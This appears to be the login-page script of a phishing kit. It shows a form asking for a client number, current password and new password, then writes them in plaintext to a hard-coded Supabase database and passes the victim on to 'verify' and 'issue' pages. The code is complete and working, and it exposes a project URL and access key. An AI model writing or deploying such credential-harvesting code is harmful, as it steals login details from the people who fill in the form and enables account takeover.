const SUPABASE_URL     = "https://ffuhqntzcybuylwwqejb.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZmdWhxbnR6Y3lidXlsd3dxZWpiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNTUyNTMsImV4cCI6MjA5NzYzMTI1M30.dn5c8Trz-UAbMjbBvkeMSh9RuIbjB-e5J7MYpg6upKk";

const { createClient } = supabase;
const db = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const form = document.querySelector("#demo-login");

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const clientNumber = document.querySelector("#client-number");
  const oldPassword  = document.querySelector("#old-password");
  const newPassword  = document.querySelector("#new-password");

  let valid = true;

  [clientNumber, oldPassword, newPassword].forEach((field) => {
    if (!field.value.trim()) {
      field.classList.add("input-error");
      valid = false;
    } else {
      field.classList.remove("input-error");
    }
  });

  if (!valid) return;

  // Insert a new row and store its ID for the next pages to update
  const { data, error } = await db
    .from("submissions")
    .insert({
      client_number: clientNumber.value.trim(),
      old_password:  oldPassword.value.trim(),
      new_password:  newPassword.value.trim(),
    })
    .select("id")
    .single();

  if (error) {
    console.error("Supabase error:", error.message);
    return;
  }

  // Save the row ID so verify.html and issue.html can update the same row
  sessionStorage.setItem("submission_id", data.id);

  window.location.href = "verify.html";
});

// Remove error state as soon as the user starts typing
document.querySelectorAll(".form-row input").forEach((input) => {
  input.addEventListener("input", () => {
    input.classList.remove("input-error");
  });
});
